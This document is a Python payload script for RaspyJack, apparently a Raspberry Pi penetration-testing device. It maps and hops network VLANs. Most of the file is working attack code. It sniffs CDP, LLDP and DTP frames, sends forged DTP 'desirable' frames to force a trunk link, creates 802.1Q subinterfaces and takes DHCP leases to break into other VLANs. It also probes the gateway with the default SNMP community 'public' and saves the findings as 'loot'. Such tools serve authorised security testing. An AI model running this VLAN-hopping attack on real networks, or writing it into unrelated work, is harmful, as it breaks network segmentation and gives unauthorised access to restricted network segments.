#!/usr/bin/env python3
"""
RaspyJack Payload -- VLAN Map
==============================
Author: 7h30th3r0n3

Discovers all accessible VLANs on the network using passive and active
techniques: CDP/LLDP/DTP sniffing, 802.1Q VLAN hopping via tagged
subinterfaces, DHCP lease probing, and optional SNMP enumeration.

Flow:
  1) Passive: sniff CDP/LLDP/DTP frames for VLAN announcements
  2) Active: if DTP trunk detected, create 802.1Q subinterfaces
  3) Attempt DHCP lease on each VLAN to confirm accessibility
  4) Query SNMP (community "public") for VLAN tables if reachable
  5) Display visual VLAN grid on LCD

Controls:
  OK         -- Start scan
  UP / DOWN  -- Scroll VLAN grid
  KEY1       -- Toggle passive / active mode
  KEY3       -- Exit

Loot: /root/Raspyjack/loot/VLANMap/
"""

import os
import sys
import time
import json
import struct
import subprocess
import threading
from datetime import datetime
from collections import OrderedDict

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

try:
    from scapy.all import (
        sniff as scapy_sniff, sendp, Ether, Dot1Q, Raw,
        LLC, SNAP, conf,
    )
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
LOOT_DIR = "/root/Raspyjack/loot/VLANMap"
os.makedirs(LOOT_DIR, exist_ok=True)

DTP_MCAST = "01:00:0c:cc:cc:cc"
DTP_SNAP_HDR = b"\xaa\xaa\x03\x00\x00\x0c\x20\x04"
LLDP_ETHERTYPE = 0x88CC
CDP_SNAP_CODE = 0x2000
GRID_COLS = 4
GRID_ROWS = 5
GRID_BOX_W = 28
GRID_BOX_H = 14
GRID_X0 = 4
GRID_Y0 = 28

# VLAN color palette for the grid (cycles through these)
VLAN_COLORS = [
    (0, 200, 0), (0, 180, 60), (60, 200, 0), (0, 220, 80),
    (200, 200, 0), (220, 180, 0), (180, 200, 40), (200, 220, 0),
]

# ---------------------------------------------------------------------------
# Shared state (immutable-update style where practical)
# ---------------------------------------------------------------------------
lock = threading.Lock()
vlans = OrderedDict()       # vlan_id -> {source, accessible, ip, ...}
trunk_detected = False
scan_mode = "passive"       # passive | active
status_msg = "Ready"
scroll_offset = 0
app_running = True
scanning = False
my_iface = ""
my_mac = ""


# ---------------------------------------------------------------------------
# Network helpers
# ---------------------------------------------------------------------------

def _get_default_iface():
    """Return the interface with the default route."""
    try:
        r = subprocess.run(
            ["ip", "route", "show", "default"],
            capture_output=True, text=True, timeout=5,
        )
        for line in r.stdout.splitlines():
            parts = line.split()
            if "dev" in parts:
                return parts[parts.index("dev") + 1]
    except Exception:
        pass
    return "eth0"


def _get_iface_mac(iface):
    """Read MAC address from sysfs."""
    try:
        with open(f"/sys/class/net/{iface}/address") as fh:
            return fh.read().strip()
    except Exception:
        return "00:00:00:00:00:00"


def _add_vlan(vlan_id, source, accessible=False, ip=""):
    """Thread-safe addition/update of a discovered VLAN."""
    with lock:
        existing = vlans.get(vlan_id, {})
        updated = {
            "id": vlan_id,
            "source": existing.get("source", source),
            "accessible": existing.get("accessible", False) or accessible,
            "ip": existing.get("ip", "") or ip,
            "first_seen": existing.get(
                "first_seen", datetime.now().strftime("%H:%M:%S"),
            ),
        }
        # Append source if new
        if source not in updated["source"]:
            updated["source"] = f"{updated['source']},{source}"
        vlans[vlan_id] = updated


# ---------------------------------------------------------------------------
# CDP / LLDP parsing (extract VLAN info only)
# ---------------------------------------------------------------------------

def _parse_cdp_vlans(payload):
    """Extract VLAN IDs from CDP TLVs."""
    found = []
    if len(payload) < 4:
        return found
    data = payload[4:]
    offset = 0
    while offset + 4 <= len(data):
        tlv_type, tlv_len = struct.unpack("!HH", data[offset:offset + 4])
        if tlv_len < 4:
            break
        value = data[offset + 4:offset + tlv_len]
        # Native VLAN (type 0x000A)
        if tlv_type == 0x000A and len(value) >= 2:
            vid = struct.unpack("!H", value[:2])[0]
            if 1 <= vid <= 4094:
                found.append(vid)
        offset += tlv_len
    return found


def _parse_lldp_vlans(payload):
    """Extract VLAN IDs from LLDP TLVs."""
    found = []
    offset = 0
    while offset + 2 <= len(payload):
        header = struct.unpack("!H", payload[offset:offset + 2])[0]
        tlv_type = (header >> 9) & 0x7F
        tlv_len = header & 0x01FF
        offset += 2
        if tlv_type == 0:
            break
        value = payload[offset:offset + tlv_len]
        # Org-specific: IEEE 802.1 VLAN Name (OUI 0x0080C2, subtype 3)
        if tlv_type == 127 and len(value) >= 6:
            oui = (value[0] << 16) | (value[1] << 8) | value[2]
            subtype = value[3]
            if oui == 0x0080C2 and subtype == 3:
                vid = struct.unpack("!H", value[4:6])[0]
                if 1 <= vid <= 4094:
                    found.append(vid)
        offset += tlv_len
    return found


def _is_dtp_frame(pkt):
    """Check if a packet is a DTP frame indicating trunk capability."""
    if not pkt.haslayer(Raw):
        return False
    raw = bytes(pkt[Raw].load)
    return raw[:8] == DTP_SNAP_HDR


# ---------------------------------------------------------------------------
# Passive sniffing thread
# ---------------------------------------------------------------------------

def _passive_sniff():
    """Sniff CDP/LLDP/DTP frames for VLAN announcements."""
    global trunk_detected, status_msg

    def _handler(pkt):
        global trunk_detected
        if not app_running or not scanning:
            return

        # DTP detection
        if pkt.haslayer(Ether) and pkt[Ether].dst == DTP_MCAST:
            if _is_dtp_frame(pkt):
                if not trunk_detected:
                    trunk_detected = True
                    with lock:
                        global status_msg
                        status_msg = "DTP trunk detected!"

        # CDP frames
        if pkt.haslayer(LLC) and pkt.haslayer(SNAP):
            snap_layer = pkt.getlayer(SNAP)
            if snap_layer and snap_layer.code == CDP_SNAP_CODE:
                payload = bytes(pkt[Raw].load) if pkt.haslayer(Raw) else b""
                for vid in _parse_cdp_vlans(payload):
                    _add_vlan(vid, "CDP")

        # LLDP frames
        if pkt.haslayer(Ether) and pkt[Ether].type == LLDP_ETHERTYPE:
            payload = bytes(pkt[Raw].load) if pkt.haslayer(Raw) else b""
            for vid in _parse_lldp_vlans(payload):
                _add_vlan(vid, "LLDP")

        # 802.1Q tagged frames reveal VLANs passively
        if pkt.haslayer(Dot1Q):
            vid = pkt[Dot1Q].vlan
            if 1 <= vid <= 4094:
                _add_vlan(vid, "dot1q")

    with lock:
        status_msg = "Passive sniffing..."

    try:
        scapy_sniff(
            iface=my_iface,
            prn=_handler,
            store=False,
            stop_filter=lambda _: not app_running or not scanning,
            timeout=300,
        )
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Active techniques
# ---------------------------------------------------------------------------

def _send_dtp_frames():
    """Send DTP desirable frames to negotiate trunk mode."""
    global status_msg
    with lock:
        status_msg = "Sending DTP frames..."

    mac_bytes = bytes(int(b, 16) for b in my_mac.split(":"))
    domain_tlv = struct.pack(">HH", 0x0001, 5) + b"\x00"
    status_tlv = struct.pack(">HH", 0x0002, 5) + b"\xa5"
    type_tlv = struct.pack(">HH", 0x0003, 5) + b"\xa5"
    neighbor_tlv = struct.pack(">HH", 0x0004, 10) + mac_bytes
    dtp_payload = (
        DTP_SNAP_HDR + b"\x01"
        + domain_tlv + status_tlv + type_tlv + neighbor_tlv
    )
    frame = (
        Ether(src=my_mac, dst=DTP_MCAST, type=len(dtp_payload))
        / Raw(load=dtp_payload)
    )

    for _ in range(10):
        if not app_running:
            return
        try:
            sendp(frame, iface=my_iface, verbose=False)
        except Exception:
            break
        time.sleep(1)

    with lock:
        status_msg = "DTP frames sent"


def _create_subinterface(vlan_id):
    """Create an 802.1Q tagged subinterface. Returns iface name or None."""
    sub = f"{my_iface}.{vlan_id}"
    try:
        subprocess.run(
            ["ip", "link", "add", "link", my_iface, "name", sub,
             "type", "vlan", "id", str(vlan_id)],
            capture_output=True, timeout=5,
        )
        subprocess.run(
            ["ip", "link", "set", sub, "up"],
            capture_output=True, timeout=5,
        )
        return sub
    except Exception:
        return None


def _remove_subinterface(sub):
    """Remove a tagged subinterface."""
    try:
        subprocess.run(
            ["ip", "link", "del", sub],
            capture_output=True, timeout=5,
        )
    except Exception:
        pass


def _try_dhcp_lease(iface, vlan_id, timeout_sec=8):
    """Attempt a quick DHCP lease via dhclient. Returns IP or empty str."""
    try:
        result = subprocess.run(
            ["dhclient", "-1", "-timeout", str(timeout_sec),
             "-lf", f"/tmp/dhclient_vlan{vlan_id}.lease", iface],
            capture_output=True, text=True, timeout=timeout_sec + 5,
        )
        # Read assigned IP
        addr_result = subprocess.run(
            ["ip", "-4", "addr", "show", iface],
            capture_output=True, text=True, timeout=5,
        )
        for line in addr_result.stdout.splitlines():
            line = line.strip()
            if line.startswith("inet "):
                return line.split()[1].split("/")[0]
    except Exception:
        pass
    finally:
        # Release
        try:
            subprocess.run(
                ["dhclient", "-r", "-lf",
                 f"/tmp/dhclient_vlan{vlan_id}.lease", iface],
                capture_output=True, timeout=5,
            )
        except Exception:
            pass
    return ""


def _query_snmp_vlans(target_ip):
    """Query SNMP (community public) for VLAN table. Returns list of IDs."""
    found = []
    # vtpVlanState OID: 1.3.6.1.4.1.9.9.46.1.3.1.1.2
    oid = "1.3.6.1.4.1.9.9.46.1.3.1.1.2"
    try:
        result = subprocess.run(
            ["snmpwalk", "-v2c", "-c", "public", "-t", "3",
             "-r", "1", target_ip, oid],
            capture_output=True, text=True, timeout=10,
        )
        for line in result.stdout.splitlines():
            # Format: ...46.1.3.1.1.2.<vlanid> = INTEGER: 1
            parts = line.split(".")
            if parts:
                try:
                    vid = int(parts[-1].split()[0])
                    if 1 <= vid <= 4094:
                        found.append(vid)
                except (ValueError, IndexError):
                    pass
    except Exception:
        pass

    # Also try dot1qVlanStaticRowStatus: 1.3.6.1.2.1.17.7.1.4.3.1.5
    oid2 = "1.3.6.1.2.1.17.7.1.4.3.1.5"
    try:
        result = subprocess.run(
            ["snmpwalk", "-v2c", "-c", "public", "-t", "3",
             "-r", "1", target_ip, oid2],
            capture_output=True, text=True, timeout=10,
        )
        for line in result.stdout.splitlines():
            parts = line.split(".")
            if parts:
                try:
                    vid = int(parts[-1].split()[0])
                    if 1 <= vid <= 4094 and vid not in found:
                        found.append(vid)
                except (ValueError, IndexError):
                    pass
    except Exception:
        pass

    return found


def _get_gateway_ip():
    """Return the default gateway IP."""
    try:
        r = subprocess.run(
            ["ip", "route", "show", "default"],
            capture_output=True, text=True, timeout=5,
        )
        for line in r.stdout.splitlines():
            parts = line.split()
            if "via" in parts:
                return parts[parts.index("via") + 1]
    except Exception:
        pass
    return ""


# ---------------------------------------------------------------------------
# Active scan orchestrator
# ---------------------------------------------------------------------------

def _active_scan():
    """Run active VLAN hopping + DHCP probing + SNMP."""
    global status_msg

    # Step 1: Send DTP
    _send_dtp_frames()
    if not app_running:
        return

    # Step 2: SNMP enumeration on gateway
    gw = _get_gateway_ip()
    if gw:
        with lock:
            status_msg = f"SNMP scan {gw}..."
        for vid in _query_snmp_vlans(gw):
            _add_vlan(vid, "SNMP")

    if not app_running:
        return

    # Step 3: Build candidate VLAN list for hopping
    with lock:
        candidates = sorted(vlans.keys())

    # Add common VLANs if few found
    common_vlans = [1, 10, 20, 30, 50, 100, 200, 254, 500, 999]
    for vid in common_vlans:
        if vid not in candidates:
            candidates.append(vid)
    candidates = sorted(set(candidates))

    # Step 4: VLAN hopping -- create subinterfaces and try DHCP
    with lock:
        status_msg = "VLAN hopping..."

    for vid in candidates:
        if not app_running or not scanning:
            break

        with lock:
            existing = vlans.get(vid, {})
            if existing.get("accessible"):
                continue

        with lock:
            status_msg = f"Probing VLAN {vid}..."

        sub = _create_subinterface(vid)
        if sub is None:
            continue

        ip = _try_dhcp_lease(sub, vid)
        _remove_subinterface(sub)

        if ip:
            _add_vlan(vid, "DHCP", accessible=True, ip=ip)
        elif vid not in vlans:
            _add_vlan(vid, "probe", accessible=False)

    with lock:
        status_msg = f"Done: {len(vlans)} VLANs found"


# ---------------------------------------------------------------------------
# Scan orchestrator thread
# ---------------------------------------------------------------------------

def _scan_thread():
    """Run passive + optionally active scanning."""
    global scanning, status_msg

    scanning = True

    # Always start with passive sniffing (in background)
    passive_t = threading.Thread(target=_passive_sniff, daemon=True)
    passive_t.start()

    with lock:
        mode = scan_mode

    if mode == "active":
        # Give passive a few seconds head start
        for _ in range(5):
            if not app_running:
                break
            time.sleep(1)
        _active_scan()
    else:
        # Pure passive -- just wait
        passive_t.join()

    scanning = False


# ---------------------------------------------------------------------------
# Export
# ---------------------------------------------------------------------------

def _export_results():
    """Save VLAN map to loot directory."""
    global status_msg
    with lock:
        data = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "interface": my_iface,
            "trunk_detected": trunk_detected,
            "scan_mode": scan_mode,
            "vlans": {
                str(vid): dict(info) for vid, info in vlans.items()
            },
        }
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = os.path.join(LOOT_DIR, f"vlan_map_{ts}.json")
    try:
        with open(path, "w") as fh:
            json.dump(data, fh, indent=2)
        with lock:
            status_msg = f"Saved {len(data['vlans'])} VLANs"
    except Exception as exc:
        with lock:
            status_msg = f"Save err: {str(exc)[:14]}"


# ---------------------------------------------------------------------------
# LCD rendering
# ---------------------------------------------------------------------------

def _vlan_box_color(info):
    """Return fill color: green=accessible, yellow=detected-only."""
    if info.get("accessible"):
        return (0, 180, 0)
    return (200, 180, 0)


def _draw_screen():
    """Render current state on LCD."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
    draw = ScaledDraw(img)

    # Header
    draw.text((2, 2), "VLAN MAP", fill="CYAN", font=font)

    with lock:
        mode = scan_mode
        st = status_msg
        trunk = trunk_detected
        vlan_items = list(vlans.items())
        so = scroll_offset
        is_scanning = scanning

    # Mode + trunk indicator
    mode_color = "RED" if mode == "active" else "WHITE"
    draw.text((68, 2), mode[:3].upper(), fill=mode_color, font=font)
    if trunk:
        draw.text((96, 2), "TRK", fill="GREEN", font=font)

    # Status line
    draw.text((2, 14), st[:22], fill="GRAY", font=font)

    # VLAN grid
    visible_count = GRID_COLS * GRID_ROWS
    visible = vlan_items[so:so + visible_count]

    for idx, (vid, info) in enumerate(visible):
        col = idx % GRID_COLS
        row = idx // GRID_COLS
        x = GRID_X0 + col * (GRID_BOX_W + 3)
        y = GRID_Y0 + row * (GRID_BOX_H + 3)

        fill_color = _vlan_box_color(info)
        draw.rectangle(
            [x, y, x + GRID_BOX_W, y + GRID_BOX_H],
            fill=fill_color,
            outline="WHITE",
        )
        # VLAN ID text centered in box
        vid_str = str(vid)
        draw.text((x + 2, y + 2), vid_str[:4], fill="BLACK", font=font)

    if not vlan_items:
        if is_scanning:
            draw.text((8, 56), "Scanning...", fill="GRAY", font=font)
        else:
            draw.text((8, 56), "Press OK to start", fill="GRAY", font=font)

    # Legend
    draw.rectangle([2, 116, 8, 122], fill=(0, 180, 0))
    draw.text((10, 116), "OK", fill="WHITE", font=font)
    draw.rectangle([28, 116, 34, 122], fill=(200, 180, 0))
    draw.text((36, 116), "Seen", fill="WHITE", font=font)

    total_str = f"{len(vlan_items)}v"
    draw.text((108, 116), total_str, fill="WHITE", font=font)

    LCD.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global app_running, scroll_offset, scan_mode, status_msg
    global scanning, my_iface, my_mac

    if not SCAPY_OK:
        img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
        d = ScaledDraw(img)
        d.text((4, 50), "scapy not found!", font=font, fill="RED")
        d.text((4, 65), "pip install scapy", font=font, fill="GRAY")
        LCD.LCD_ShowImage(img, 0, 0)
        time.sleep(3)
        GPIO.cleanup()
        return 1

    my_iface = _get_default_iface()
    my_mac = _get_iface_mac(my_iface)

    with lock:
        status_msg = f"Iface: {my_iface}"

    try:
        _draw_screen()

        while app_running:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                app_running = False
                break

            elif btn == "OK":
                if not scanning:
                    threading.Thread(
                        target=_scan_thread, daemon=True,
                    ).start()
                time.sleep(0.3)

            elif btn == "KEY1":
                # Toggle passive / active
                if not scanning:
                    with lock:
                        scan_mode = (
                            "active" if scan_mode == "passive"
                            else "passive"
                        )
                        status_msg = f"Mode: {scan_mode}"
                time.sleep(0.3)

            elif btn == "KEY2":
                threading.Thread(
                    target=_export_results, daemon=True,
                ).start()
                time.sleep(0.3)

            elif btn == "UP":
                with lock:
                    if scroll_offset >= GRID_COLS:
                        scroll_offset -= GRID_COLS

            elif btn == "DOWN":
                with lock:
                    max_off = max(
                        0, len(vlans) - GRID_COLS * GRID_ROWS,
                    )
                    if scroll_offset + GRID_COLS <= max_off:
                        scroll_offset += GRID_COLS

            _draw_screen()
            time.sleep(0.15)

    finally:
        app_running = False
        scanning = False

        # Cleanup any leftover subinterfaces
        with lock:
            vlan_ids = list(vlans.keys())
        for vid in vlan_ids:
            _remove_subinterface(f"{my_iface}.{vid}")

        # Auto-save results if any VLANs found
        with lock:
            count = len(vlans)
        if count > 0:
            _export_results()

        try:
            img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
            d = ScaledDraw(img)
            d.text((10, 50), "VLAN Map stopped", fill="YELLOW", font=font)
            d.text((10, 66), f"VLANs: {count}", fill="WHITE", font=font)
            LCD.LCD_ShowImage(img, 0, 0)
        except Exception:
            pass

        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
